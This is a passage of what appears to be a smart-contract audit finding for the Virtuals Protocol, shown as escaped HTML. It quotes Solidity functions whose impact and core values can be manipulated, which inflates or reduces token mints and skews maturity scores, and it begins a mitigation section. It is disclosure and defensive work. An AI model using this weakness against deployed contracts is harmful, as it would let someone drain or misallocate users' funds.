class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);           \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Uses getImpact\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk15\"\u003econtinue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eServiceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_serviceRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardImpacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNftContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetCore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)] += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . . \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/token/Minter.sol#L134\"\u003e\u003ccode\u003eMinter::mint\u003c/code\u003e\u003c/a\u003e uses the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120\"\u003e\u003ccode\u003eServiceNft::getImpact\u003c/code\u003e\u003c/a\u003e call to transfer tokens; hence, leading to excess or lower funds being transferred.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtribution\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetDatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enftId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Uses getImpact\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDENOM\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edataAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ? (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalImpactMultiplier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDENOM\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            : \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L179\"\u003e\u003ccode\u003eAgentDAO::_calcMaturity\u003c/code\u003e\u003c/a\u003e uses \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L124\"\u003e\u003ccode\u003eContributionNft::getCore\u003c/code\u003e\u003c/a\u003e which would calculate incorrect core allowing to manipulate \u003ccode\u003ecoreService\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_calcMaturity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_agentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_agentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenVirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetCore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);                 \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Hence, calculating incorrect core.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreService\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetCoreService\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// All services start with 100 maturity\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreService\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetMaturity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreService\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIEloCalculator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_agentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetEloCalculator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebattleElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eDue to lack of documentation, from my personal understanding the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L33\"\u003ecomment\u003c/a\u003e helps in inferring that the function was meant to be guarded:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprivate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Admin is able to 